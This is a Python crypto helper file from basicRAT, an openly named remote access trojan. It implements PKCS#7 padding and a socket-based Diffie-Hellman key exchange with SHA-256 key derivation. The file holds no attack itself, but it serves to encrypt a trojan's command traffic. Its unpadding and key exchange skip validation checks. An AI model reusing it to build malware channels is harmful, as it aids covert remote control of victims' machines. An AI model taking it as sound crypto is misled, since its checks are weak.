# -*- coding: utf-8 -*-

#
# basicRAT crypto module
# https://github.com/vesche/basicRAT
#

import os

from aes_gcm import *
from Crypto.Hash import SHA256
from Crypto.Util.number import bytes_to_long, long_to_bytes


class PaddingError(Exception):
    pass


# PKCS#7 - RFC 2315 section 10.3.2
def pkcs7(s, bs=16):
    i = (bs - (len(s) % bs))
    return s + (chr(i)*i)


# Strip PKCS#7 padding - throws PaddingError on failure
def unpkcs7(s):
    i = s[-1]
    if s.endswith(i*ord(i)):
        return s[:-ord(i)]
    raise PaddingError('PKCS7 improper padding {}'.format(repr(s[-32:])))


# Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631
def diffiehellman(sock, bits=2048):
    # using RFC 3526 MOPD group 14 (2048 bits)
    p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF;
    g = 2
    a = bytes_to_long(os.urandom(32)) # a 256bit number, sufficiently large
    xA = pow(g, a, p)

    sock.send(long_to_bytes(xA))
    b = bytes_to_long(sock.recv(256))

    s = pow(b, a, p)
    return SHA256.new(long_to_bytes(s)).digest()
